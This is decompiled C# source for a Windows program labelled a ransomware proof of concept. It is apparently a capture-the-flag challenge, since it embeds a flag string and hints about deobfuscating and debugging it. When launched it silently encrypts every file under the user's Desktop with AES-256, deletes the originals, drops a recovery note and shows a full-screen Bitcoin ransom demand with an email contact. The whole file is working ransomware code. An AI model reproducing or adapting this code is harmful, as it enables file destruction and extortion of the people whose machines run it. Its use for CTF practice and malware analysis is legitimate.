using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace RansomwarePOC;

public class Form1 : Form
{
	private static string string_0 = "";

	private string string_1;

	private string string_2;

	private static int int_0 = 0;

	private IContainer icontainer_0;

	private Label label_0;

	internal string string_3;

	internal string string_4;

	internal Label label_1;

	internal Label label_2;

	internal TextBox textBox_0;

	internal Label label_3;

	internal PictureBox pictureBox_0;

	internal Label label_4;

	internal TextBox textBox_1;

	public string RANSOM_LETTER1
	{
		get
		{
			return string_3;
		}
		set
		{
			string text = (string_3 = value);
		}
	}

	public Form1()
	{
		string text = (string_3 = "\n\nZmluZCBhIGRlb2JmdXNjYXRvcg==\nZmluZCBhIGRlYnVnZ2Vy\n\n\n\nEncryption Log:\n----------------------------------------\n");
		string_1 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string text2 = (string_4 = Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		icontainer_0 = null;
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		method_2();
		encryptFolderContents(string_1);
		if (int_0 > 0)
		{
			method_1();
			method_0();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void method_0()
	{
		StreamWriter streamWriter = new StreamWriter(string_1 + "\\___RECOVER__FILES__.jcrypt.txt");
		streamWriter.WriteLine(RANSOM_LETTER1);
		streamWriter.WriteLine(string_0);
		streamWriter.Close();
	}

	private void method_1()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)label_0).set_Text("Ooops...Your files (count: " + int_0 + ") have been encrypted!");
	}

	private void method_2()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)label_1).set_Text("You can demand the decrypter(in exchange for points) or you can reverse the handsomeware of course :)");
		((Control)label_2).set_Text("Also the strings up and below may help you to find the flag");
		((Control)label_3).set_Text("Sorry about that :) In order to recover your data");
		((Control)textBox_1).set_Text("ZmluZCBhIGRlb2JmdXNjYXRvcg==");
		((Control)textBox_0).set_Text("ZmluZCBhIGRlYnVnZ2Vy");
		((Control)label_1).Focus();
	}

	public void encryptFolderContents(string sDir)
	{
		try
		{
			string fileName = Path.GetFileName(Assembly.GetEntryAssembly()!.Location);
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (text != sDir + "\\" + fileName && !text.Contains(".jcrypt"))
				{
					try
					{
						Console.Out.WriteLine("Encrypting: " + text);
						smethod_0(text, "flag:handsomewareSYDT2021");
					}
					catch
					{
					}
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				try
				{
					encryptFolderContents(sDir2);
				}
				catch
				{
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void smethod_0(string string_5, string string_6)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(string_5 + ".jcrypt", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(string_6);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_5, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			string_0 = string_0 + string_5 + "\n";
			int_0++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(string_5);
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	public static string GetMD5Checksum(string filename)
	{
		using MD5 mD = MD5.Create();
		using FileStream inputStream = File.OpenRead(filename);
		byte[] array = mD.ComputeHash(inputStream);
		return BitConverter.ToString(array).Replace("-", "");
	}

	private void textBox_1_TextChanged(object sender, EventArgs e)
	{
	}

	private void label_0_Click(object sender, EventArgs e)
	{
	}

	private void label_2_Click(object sender, EventArgs e)
	{
	}

	private void label_3_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0208: Unknown result type (might be due to invalid IL or missing references)
		//IL_0212: Expected O, but got Unknown
		//IL_02bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c9: Expected O, but got Unknown
		//IL_035e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Expected O, but got Unknown
		//IL_0413: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Expected O, but got Unknown
		//IL_04a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ac: Expected O, but got Unknown
		//IL_0542: Unknown result type (might be due to invalid IL or missing references)
		//IL_054c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label_0 = new Label();
		Label val = (label_1 = new Label());
		Label val2 = (label_2 = new Label());
		TextBox val3 = (textBox_0 = new TextBox());
		Label val4 = (label_3 = new Label());
		PictureBox val5 = (pictureBox_0 = new PictureBox());
		Label val6 = (label_4 = new Label());
		TextBox val7 = (textBox_1 = new TextBox());
		((ISupportInitialize)pictureBox_0).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label_0).set_Anchor((AnchorStyles)14);
		((Control)label_0).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_0).set_ForeColor(Color.White);
		((Control)label_0).set_Location(new Point(12, 425));
		((Control)label_0).set_Name("Ⴗ");
		((Control)label_0).set_Size(new Size(914, 55));
		((Control)label_0).set_TabIndex(0);
		((Control)label_0).set_Text("Your files (count: n) have been encrypted!");
		label_0.set_TextAlign((ContentAlignment)32);
		((Control)label_0).add_Click((EventHandler)label_0_Click);
		((Control)label_1).set_Anchor((AnchorStyles)14);
		((Control)label_1).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_1).set_ForeColor(Color.White);
		((Control)label_1).set_Location(new Point(12, 567));
		((Control)label_1).set_Name("Ⴈ");
		((Control)label_1).set_Size(new Size(914, 55));
		((Control)label_1).set_TabIndex(1);
		((Control)label_1).set_Text("Please send n Bitcoin(s) to the following BTC address:");
		label_1.set_TextAlign((ContentAlignment)32);
		((Control)label_2).set_Anchor((AnchorStyles)14);
		((Control)label_2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_2).set_ForeColor(Color.White);
		((Control)label_2).set_Location(new Point(12, 672));
		((Control)label_2).set_Name("Ⴜ");
		((Control)label_2).set_Size(new Size(914, 55));
		((Control)label_2).set_TabIndex(2);
		((Control)label_2).set_Text("Next, E-mail your transaction ID to the following address:");
		label_2.set_TextAlign((ContentAlignment)32);
		((Control)label_2).add_Click((EventHandler)label_2_Click);
		((Control)textBox_0).set_Anchor((AnchorStyles)2);
		((Control)textBox_0).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox_0).set_Location(new Point(136, 730));
		((Control)textBox_0).set_Name("ႭႠ");
		((TextBoxBase)textBox_0).set_ReadOnly(true);
		((Control)textBox_0).set_Size(new Size(677, 44));
		((Control)textBox_0).set_TabIndex(4);
		((Control)textBox_0).set_Text("friendly.cyber.criminal@gmail.com");
		textBox_0.set_TextAlign((HorizontalAlignment)2);
		((Control)label_3).set_Anchor((AnchorStyles)14);
		((Control)label_3).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_3).set_ForeColor(Color.White);
		((Control)label_3).set_Location(new Point(12, 480));
		((Control)label_3).set_Name("ႭႭ");
		((Control)label_3).set_Size(new Size(914, 87));
		((Control)label_3).set_TabIndex(5);
		((Control)label_3).set_Text("In order to recover your data...");
		label_3.set_TextAlign((ContentAlignment)2);
		((Control)label_3).add_Click((EventHandler)label_3_Click);
		((Control)pictureBox_0).set_Anchor((AnchorStyles)15);
		pictureBox_0.set_Image((Image)componentResourceManager.GetObject("ႭႰ.Image"));
		((Control)pictureBox_0).set_Location(new Point(298, 12));
		((Control)pictureBox_0).set_Name("ႭႰ");
		((Control)pictureBox_0).set_Size(new Size(343, 386));
		pictureBox_0.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox_0.set_TabIndex(6);
		pictureBox_0.set_TabStop(false);
		((Control)label_4).set_Anchor((AnchorStyles)14);
		((Control)label_4).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_4).set_ForeColor(Color.Crimson);
		((Control)label_4).set_Location(new Point(12, 777));
		((Control)label_4).set_Name("ႭႣ");
		((Control)label_4).set_Size(new Size(914, 71));
		((Control)label_4).set_TabIndex(8);
		((Control)label_4).set_Text(".");
		label_4.set_TextAlign((ContentAlignment)32);
		((Control)textBox_1).set_Anchor((AnchorStyles)2);
		((Control)textBox_1).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox_1).set_Location(new Point(136, 625));
		((Control)textBox_1).set_Name("ႭႳ");
		((TextBoxBase)textBox_1).set_ReadOnly(true);
		((Control)textBox_1).set_Size(new Size(677, 44));
		((Control)textBox_1).set_TabIndex(3);
		((Control)textBox_1).set_Text("1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1");
		textBox_1.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox_1).add_TextChanged((EventHandler)textBox_1_TextChanged);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Crimson);
		((Form)this).set_ClientSize(new Size(938, 857));
		((Control)this).get_Controls().Add((Control)(object)label_4);
		((Control)this).get_Controls().Add((Control)(object)label_3);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_1);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)pictureBox_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Lol");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox_0).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
